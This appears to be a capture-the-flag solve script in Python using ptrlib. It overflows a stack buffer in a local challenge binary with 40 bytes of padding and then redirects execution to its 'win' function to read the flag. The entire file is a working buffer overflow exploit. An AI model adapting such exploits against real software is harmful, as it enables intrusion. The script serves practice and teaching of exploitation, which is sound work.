#!/usr/bin/env python
import ptrlib as p


def unwrap(x):
    if x is None:
        exit(1)
    else:
        return x


elf = p.ELF("./chall")

offset = 40
payload = b"A" * offset
payload += p.p64(unwrap(elf.symbol("win")))

io = p.Process(elf.filepath)
io.sendline(str(len(payload)))
io.sendline(payload)

flag_content = io.recvregex(b"flag\{(.*?)\}")[0].decode()
flag = "flag{" + flag_content + "}"
p.logger.info(f"flag: {flag}")
